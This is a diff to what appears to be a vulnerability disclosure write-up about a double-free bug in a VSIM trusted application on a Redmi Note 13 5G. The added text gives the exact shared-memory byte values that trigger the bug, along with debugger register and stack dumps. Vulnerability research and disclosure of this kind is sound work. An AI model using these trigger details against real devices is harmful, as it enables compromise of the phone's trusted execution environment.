@@ -179,7 +179,7 @@ Additionally, to meet the condition at line 13 in `FUN_comm_0x1001`, we suggest 
 79	}
 ```
 
-Later, `del_imsi_index` in `FUN_comm_0x1001` is invoked with the buffer `__ptr` as its parameter. On our test device, the function fails and returns **0** because the `/sim/imsi.index` file is missing. This behavior can be confirmed by the logs shown in the **Screenshots** section, specifically `Open file /sim/imsi.index fail` and `read imsi table fail`.
+Later, `del_imsi_index` in `FUN_comm_0x1001` is invoked with the buffer `__ptr` as its parameter. On our test device (`Redmi Note 13 5G`), the function fails and returns **0** because the `/sim/imsi.index` file is missing. This behavior can be confirmed by the logs shown in the **Screenshots** section, specifically `Open file /sim/imsi.index fail` and `read imsi table fail`.
 
 Furthermore, even when the file exists, it is still possible to modify `mem_area1`, which in turn affects the output of `unhexlify`. As a result, the `consttime_memcmp` check inside `del_imsi_index` fails, leading the function to return **0** as well.
 
@@ -228,7 +228,7 @@ This can be done by inserting a '\0' byte into `mem_area1 + 8`, replacing an ori
 ```
 
 
-Until now, everything is quite clear: by manipulating the shared memory between different fetches, we can pass the checks successfully and eventually trigger the double-free bug.
+Until now, everything is quite clear: by manipulating the shared memory between different fetches (if the specific file is not missing), we can pass the checks successfully and eventually trigger the double-free bug.
 
 
 
@@ -237,13 +237,11 @@ Until now, everything is quite clear: by manipulating the shared memory between 
 
 ```C
 [+]     [%s:%s][%s:%d]==func: 0
-[+]     enter==
-: 0
+[+]     enter==: 0
 [+]     VSIMApp: 0
 [+]     INFO: 0
 [+]     TA_CreateEntryPoint: 0
-[+]     exit==
-: 0
+[+]     exit==: 0
 [=]     [TA_OpenSessionEntryPoint] start @0x55555557a0a8
 [=]     printf: [VSIMApp:INFO][TA_OpenSessionEntryPoint:34]==func enter==
 
@@ -368,7 +366,16 @@ Traceback (most recent call last):
 ```
 
 
+
+
 ### Source code of the POC
+
+As you can see from the POC, it is unnecessary to modify the contents of `mem_area1` or race against the checks with an additional thread, because the absence of the `/sim/imsi.index` file makes it easier for `del_imsi_index` to return zero in our device (`Redmi Note 13 5G`).
+
+What we do here is simply set `*(int *)(mem_area1 + 4)` as 0x12 and put the single `\0` byte at the offset 8:
+> 0x01, 0x00, 0x00, 0x00, **0x12**, 0x00, 0x00, 0x00, **0x00**, 0x36, 0x00
+
+That alone is enough to trigger the double free automatically.
 
 
 ```C
@@ -456,6 +463,38 @@ int main(int argc, char **argv)
     TEEC_FinalizeContext_impl(&context);
     return 0;
 }
+```
+
+For more context, in this PoC, the final `strlen(__s_00)` in `_get_path_from_imsi` ends up as 5, less than 0x17.
+
+```C
+$x0      : 0x0000000000000005
+$x1      : 0x0000000000000018
+$x2      : 0x000055555555b3e1  ->  0x6165720073257325 ('%s%s'?)
+$x3      : 0x000055555555b246  ->  0x7400002f6d69732f ('/sim/'?)
+$x4      : 0x00000000bbbbe008  ->  0x0000000000003600
+...
+-------------------------------------------------------------------- stack ----
+  $sp  0x8000002ddd70|+0x0000|+000: 0x000055555555a99a  ->  0x007070414d495356 ('VSIMApp'?)  <-  $x22
+       0x8000002ddd78|+0x0008|+001: 0x00000000bbbbe008  ->  0x0000000000003600  <-  $x4, $x20
+       0x8000002ddd80|+0x0010|+002: 0x0000000000000000
+       0x8000002ddd88|+0x0018|+003: 0x00000000aaaaa020  ->  0x0000002f6d69732f ('/sim/'?)  <-  $x21
+ $x29  0x8000002ddd90|+0x0020|+004: 0x00008000002dddc0  ->  0x00008000002dde00  ->  0x0000000000000000
+       0x8000002ddd98|+0x0028|+005: 0x0000555555576990  ->  0xaa1f03e1b4000260
+       0x8000002ddda0|+0x0030|+006: 0x0000000000001001
+       0x8000002ddda8|+0x0038|+007: 0x0000000000000000
+--------------------------------------------- code: arm64:ARM (gdb-native) ----
+    0x555555579034 c9070094          <NO_SYMBOL>   bl     0x55555557af58
+    0x555555579038 e00315aa          <NO_SYMBOL>   mov    x0, x21
+*   0x55555557903c d5d60094          <NO_SYMBOL>   bl     0x5555555aeb90        // call to strlen()
+*-> 0x555555579040 1f5c00f1          <NO_SYMBOL>   cmp    x0, #0x17
+    0x555555579044 a1010054          <NO_SYMBOL>   b.ne   0x555555579078 // b.any
+    0x555555579048 00ffff90          <NO_SYMBOL>   adrp   x0, 0x555555559000  ('%s:%d]apdu error\n')
+    0x55555557904c 01ffffb0          <NO_SYMBOL>   adrp   x1, 0x55555555a000  ('F0FA2C892376C84ACE1BB4E3019B71634C01131159CAE03CEE9D9932184BEEF2[...]')
+    0x555555579050 e2feffb0          <NO_SYMBOL>   adrp   x2, 0x555555556000  ('alid\n'?)
+    0x555555579054 e3feff90          <NO_SYMBOL>   adrp   x3, 0x555555555000
+------------------------------------------------------------------ threads ----
+[*Thread Id:1, tid:6550] Name: "3d08821c-33a6-11e6-a1fa089e01c83aa2.ta", stopped at 0x555555579040 <NO_SYMBOL>, reason: BREAKPOINT
 ```
 
 
